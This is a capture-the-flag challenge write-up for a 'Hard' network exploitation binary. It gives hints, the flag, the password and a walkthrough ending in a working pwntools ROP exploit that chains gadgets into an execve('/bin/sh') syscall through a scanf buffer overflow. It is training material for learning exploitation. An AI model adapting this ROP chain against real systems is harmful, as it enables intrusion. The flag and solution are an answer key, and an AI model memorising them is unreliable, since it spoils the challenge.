

# Challenge Name

Mastermind's HIVE

# Point Value and Assessed Difficulty

350  
Hard

# Category

Network Exploitation

# Challenge Prompt/Question


The evil villan Trexisgoingtoeatyouoh is at it again. We've discovered an online toolkit that is attacking the Moustache League's hideouts all over the world. It has some type of authentication and we need you to stop it!



* [binary](hive)

# Hints


If the challenge is too difficult any of these hints should help the challengers and can be released depending on where they are during their exploit development or where they are stuck.

* __Hint 1:__ *(MD5 Hash Clue)* What type of function is typically used to validate a password when it is NOT stored as plaintext?
* __Hint 2:__ *(Discover Plaintext Hash Collision)* What is a rainbow table?
* __Hint 3:__ *(Locate the ROP vuln - don't bother with beating the game)* Are there any Easter Eggs?
* __Hint 4:__ *(Custom ROT13 Crypto)* What is different about the crypto - what is a seed?
* __Hint 5:__ *(Problems sorting through a static binary)* Release the ```hive-full``` binary which has all the dynamic symbols in it.
* __Hint 6:__ *(Use ROP Clue)* How can you bypass non-executable stack protections without libc?

# Key


flag{7_R3X_1$_G0ING_2_Eat-You-0h!}

# Walkthrough

This challenge requires some knowledge of reversing, crypto, 64-bit assembly, and return oriented programming. There are two parts to solve 1) reverse the crypto and find a MD5 hash collision; and 2) Take advantage of a buffer overflow through return oriented programming.

## Concept Development

This challenge requires ```libssl-dev``` in order to work due to its use of the openssl library to perform hashing functions. It contains two parts: 1) the [source code](hive.c) and 2) the [header file](hive.h). A precompiled [binary](hive) (stripped and symbols intact) is also included for testing.

The goal behind developing this challenge was to provide multiple levels of difficulty including - reversing, crypto, and a buffer overflow. The buffer overflow is hidden behind an "Easter Egg", where if the user provides the right type of input they gain access to another interface/taunt inside the program - which leads to the vulnerability. This challenge is divided into three parts of medium-to-high difficulty.

## Discovery

Part 1, has three entry points of which one does nothing. Part 2, revolves around discovering a trivial Easter Egg that leads to Part 3. Part 3 is the actual vulnerability, and involves discovering and exploiting a buffer overflow using ROP and featuring a non-executable stack.

### Part 1 - _Authentication:_
* **Provide a plain text password.** That can be found after using a [custom rot13](http://rumkin.com/tools/cipher/rot13.php) [\[1\]](#endnote1) transformation on a static SECRET and then deriving the plain text based on [md5 hash collisions](https://crackstation.net/).
* **Provide a security token.** A time token is provided early in the connection. It must be evaluated against the ```server time*(salt%30)+1``` and then encoded as an MD5 hash.
* Since the security token is based on the time the user must provide a new one each time the program is accessed.

### Part 2 - _Easter Egg:_

* The easter egg is hidden inside the taunt function underneath the 'Evil Menu'. When asked to provide a taunt if the total sum of the characters provided are equal to ```0x1337 or 4919```. The user is then provided access to an easter egg that let's the user know they are 'Real Evil'.

### Part 3 - _Vulnerability:_

* The vulnerability lies in the 'Easter Egg'. There is an unbound ```scanf()``` that will allow a **buffer overflow**. However, since stack execution is not permitted the user is forced to implement a [return oriented programming (ROP) solution](https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf). [\[2\]](#endnote2)
* Return-into-libc is not a viable option because this binary is statically compiled. Additionally, there is no simple ```execve``` or ```system``` command readily available to use.
* The user is however able to take advantage of a considerable number of gadgets which allow them to load registers with whatever values they want such as - ```mov```, ```pop```, ```ret```, and ```syscall```. There are a number of ways to execute the operation but at a minimum the user will need the following gadgets:
    * A gadget that will ```pop``` into RAX, RDI, RSI, and RDX.
    * A gadget that will allow them to manipulate a _writeable_ area of memory .
    * A gadget that will allow will be able to take a value on the stack and place it into a register such as a ```mov register, [register]``` instruction
    * A ```int 0x80``` or ```syscall``` gadget.
* There are a few limitations due to the nature of ```scanf()``` that must also be overcome on individual bytes. [\[3\]](#endnote3)


## Solution

The solution is automated in python and uses the [pwntools](http://pwntools.readthedocs.org/en/latest/intro.html) library for simplicity. Testing for a solution was done via attaching to a process in gdb as shown on lines 29-32. However, a remote exploit would work just as easily by changing the process in line 28 to a ```remote(ipAddr, port)``` combination. It's important to note that all address values passed to the vulnerable program must be 8 bytes in size and little endian in order to be interpreted properly by the program itself. I set about doing this in the easiest way - the p64() method from pwntools.

Lines 21-26 Handle the transformation of the authentication token. All gadgets used from the binary are defined in a dictionary from lines 11-19. Finally, the ROP chain is built beginning at line 45 and ending with a ```interactive()``` method calling to establish a two-way pipe for communication.

----

# Proof of Exploit/Solution

```python
#!/usr/bin/python

from pwn import *

context.log_level = 'info'

#Update this rop list as needed in order to get shell
#Gadgets cannot contain whitespace character such as:
#"Space" - /x20; "Line Feed" - /x0a; "Form Feed" - x0c;
#"Carriage Return" - /x0d; "Tab" - /x09
rop_list = {
"syscall":  0x447f31,       # syscall
"poprdi":   0x4033cb,       # pop rdi; ret
"pop2ret":  0x43df49,       # pop rdx; pop rsi ; ret
"poprax":   0x43c6ad,       # pop rax; ret
"movrdi":   0x47f3dd,       # mov [rdi], rax ; mov eax, 1 ; ret
"data":     0x6c2dc0,       # bss section - gives a workspace
"binsh":    "/bin/sh\x00"   # need to get shell!
}

def TimeToken(arg):
    log.info("Building Token" +
            "\n\tOriginal Value is:    " + str(arg) +
            "\n\tCalculated Token is:  " + str(arg/(arg%30)+1) +
            "\n\tmd5 hash is:          " + md5sumhex(str(arg/(arg%30)+1)))
    return md5sumhex(str(arg/(arg%30)+1))

c = process('./hive')
#gdb.attach(c, """
#            b evilTaunt
#            c
#            """)

log.info("Handling authentication" +
        "\n\tUsername is: \"\"" +
        "\n\tPassword is: 5up3rm@n")
c.sendline("")
c.sendline("5up3rm@n")
t = int(c.recvuntil(", please", drop=True).split()[3])
c.sendline(str(TimeToken(t)))

log.info("Moving into secret menu.")
c.sendline("3")

c.sendline("/"*103+"N")
log.info("Beginning ROP Chain")
log.info("Sending filler for buffer + EBP.")
c.send("A"*128+"B"*8)
c.send(p64(rop_list["poprdi"]))
c.send(p64(rop_list["data"]))
c.send(p64(rop_list["poprax"]))
c.send(rop_list["binsh"])
c.send(p64(rop_list["movrdi"]))
c.send(p64(rop_list["poprax"]))
c.send(p64(59))
c.send(p64(rop_list["pop2ret"]))
c.send(p64(0x0))
c.send(p64(0x0))
c.sendline(p64(rop_list["syscall"]))
log.info("Have fun with your shell!")
c.interactive()

```

----

# Endnotes

<a name="endnote1">[1]</a>: rot13 is a substitution cipher that takes an alphabet and rotates a plaintext entry by 13. Thus, the letter B will transform into the letter O. Generally, this is applied to upper and lower case letters. The custom functionality of the encoding scheme in this problem also applies it to numbers. More information can be found [here](https://en.wikipedia.org/wiki/ROT13)

<a name="endnote2">[2]</a>: Return Oriented Programming (ROP) is a method of exploitation which uses a number of return addresses already present in a program to chain together executable code. The chain is created by a group of gadgets. Gadgets are pieces of intended or unintended code assembly instructions that are executable due to their location inside the code section of the binary. In general, a ROP sequence usually ends with a ```ret```, ```int```, or ```syscall``` instruction in order to perform multiple sequences of instructions or gadgets. More can be found [here](https://www.exploit-db.com/docs/28479.pdf)

<a name="endnote3">[3]</a>: scanf is a scans input via a format string. The format string consists of [directives](http://www.informit.com/articles/article.aspx?p=28790&seqNum=2) that sequence input. The processing fails when no further input is read, a directive fails, or ```scanf()``` returns. A directive fails on white-space characters, characters that don't match the directive, or a sequence that doesn't match the conversion. More information can be found [here](http://linux.die.net/man/3/sscanf)
